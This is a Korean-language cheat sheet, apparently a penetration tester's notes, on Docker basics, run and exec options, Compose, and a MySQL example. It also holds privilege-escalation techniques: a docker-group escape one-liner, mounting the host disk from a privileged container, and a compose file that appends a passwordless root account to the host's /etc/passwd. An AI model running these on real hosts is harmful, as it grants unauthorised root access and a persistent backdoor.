## 기본 개념

| 용어 | 설명 |
|------|------|
| `image` | 컨테이너를 만들기 위한 레시피 |
| `container` | 이미지(레시피)로 실행한 결과물 (요리) |

---
## Docker Escape(Docker group)
- https://gtfobins.org/gtfobins/docker/
```bash
docker run -v /:/mnt --rm -it alpine chroot /mnt /bin/sh
```

---
## 이미지 & 컨테이너 조회

```bash
# 로컬에 저장된 이미지 목록 확인
sudo docker images

# 실행 중이거나 종료된 컨테이너 전체 목록 확인
sudo docker ps -a
```

---
## 3. 컨테이너 실행

```bash
sudo docker run -it -v $(pwd):/share <image>:latest
```

| 옵션 | 설명 |
|------|------|
| `-it` | 대화형 터미널 모드 (interactive + tty) |
| `-v` | 호스트 디렉토리를 컨테이너 내부에 마운트 |
| `-d` | 백그라운드(detach) 모드로 실행 |
| `-p` | 호스트 포트를 컨테이너 포트에 연결 (`호스트:컨테이너`) |

---

## 마운트 & OverlayFS

```bash
mount
```

- 컨테이너를 실행하면 Docker는 **OverlayFS**를 통해 파일시스템을 마운트한다.
- `mount` 명령으로 `overlay` 마운트 포인트를 확인하면 컨테이너의 레이어 구조를 볼 수 있다.

---

## 컨테이너 내부 접근 (exec)

```bash
sudo docker exec -it --privileged --user root <container_id> bash
```

- `--privileged` + `--user root` 옵션으로 루트 권한 획득 가능.
- 이후 호스트 디스크를 컨테이너 내부에 마운트하여 호스트 파일시스템에 접근할 수 있다.

```bash
# 컨테이너 안에서 호스트 디스크 마운트
mount /dev/sda1 /mnt/
```

> ⚠️ `--privileged` 옵션은 보안상 위험할 수 있으므로 신뢰된 환경에서만 사용할 것.

---

## Docker Compose

```bash
# 백그라운드로 서비스 전체 시작
docker compose up -d

# 실행 중인 서비스 상태 확인
docker compose ps

# 특정 서비스 컨테이너에 접속
docker compose exec -it <service_name> bash
```
---
## docker-compose.yaml
```yaml
version: "3.8"

services:
  suidbash:
    image: ubuntu:latest
    container_name: suid_bash_container
    volumes:
      - /etc/passwd:/mnt/passwd:rw
    entrypoint: ["/bin/bash", "-c", "echo 'root2::0:0::/root:/bin/bash' >> /mnt/passwd && tail -f /dev/null"]
    tty: true
```

**핵심 동작:**

| 설정 항목 | 역할 |
|-----------|------|
| `volumes` | 호스트의 `/etc/passwd`를 컨테이너 내부에 읽기/쓰기로 마운트 |
| `entrypoint` | 컨테이너 시작 시 패스워드 없는 root 계정(`root2`) 추가 |
| `tty: true` | 컨테이너가 종료되지 않고 유지되도록 설정 |

## 왜 컨테이너 안에서 수정했는데 호스트가 변조되는가?

```yaml
volumes:
  - /etc/passwd:/mnt/passwd:rw
```

이 설정은 **파일을 복사하는 것이 아니라 연결**

```
호스트 파일시스템               컨테이너 파일시스템

  /etc/passwd    ←─────────→   /mnt/passwd
       ↑             동일한          ↑
    실제 파일          파일!       그냥 별명
```

- 호스트의 `/etc/passwd`와 컨테이너의 `/mnt/passwd`는 **같은 파일을 서로 다른 경로로 바라보는 것**
- 따라서 컨테이너 안에서 `/mnt/passwd`를 수정하면 → **호스트의 `/etc/passwd`가 직접 수정됨**

---
## 네트워크 참고

- Docker 브리지 네트워크는 주로 `172.17.0.0/16` ~ `172.31.0.0/16` 대역을 사용한다.

- 172.17.0.0/16 ~ 172.31.0.0/16 대역에 속하는 경우가 많다.

---
## 실전 예시 — MySQL 컨테이너 실행

```bash
docker run \
  --name limesurvey-mysql \
  -e MYSQL_ROOT_PASSWORD=rootpass123 \
  -e MYSQL_DATABASE=limesurvey \
  -e MYSQL_USER=limeuser \
  -e MYSQL_PASSWORD=limepassword \
  -p 3306:3306 \
  -d mysql:latest
```

| 옵션 | 설명 |
|------|------|
| `--name` | 컨테이너 이름 지정 |
| `-e` | 환경 변수 설정 (DB명, 계정 정보 등) |
| `-p 3306:3306` | 호스트 3306 포트 → 컨테이너 3306 포트 연결 |
| `-d mysql:latest` | MySQL 최신 이미지를 백그라운드로 실행 |
